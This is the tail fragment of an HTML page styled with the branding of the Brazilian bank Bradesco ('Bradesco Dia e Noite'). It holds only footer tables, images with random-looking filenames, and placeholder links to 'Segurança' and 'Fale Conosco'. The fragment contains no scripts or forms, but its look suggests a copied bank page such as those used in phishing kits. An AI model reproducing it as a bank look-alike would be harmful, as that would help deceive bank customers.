<tr>
<td width="242" height="104" ><div align="center"><a href="#"><img src="images/a29839242342.jpg" width="216" height="75" border="0" /></a></div></td>
</tr>
<tr>
  <td height="20">&nbsp;</td>
</tr>
</table>


</div>
</div>

<div id="roda01">
<div id="roda02">
<div id="roda03">
<table width="205" align="center">
<tr>
<td width="197" height="96"><img src="images/rrb237894792749.jpg" width="197" height="52" title="Bradesco Dia e Noite" /></td>
</tr>
</table>
</div><!--roda03-->
<div id="a9485279324">
<table width="734" cellpadding="0" cellspacing="0">
<tr>
<td width="371" height="28" align="center" style=" font-family:Verdana, Geneva, sans-serif; font-size:12px;border-right:1px solid #CCC;""><a href="#">Seguran&ccedil;a</a></td>
<td width="10">&nbsp;</td>
<td width="351"align="center" style=" font-family:Verdana, Geneva, sans-serif;font-size:12px;"><a href="#">Fale Conosco</a></td>
</tr>
</table>
</div><div id="roda05"></div></div></div>

</body>
</html>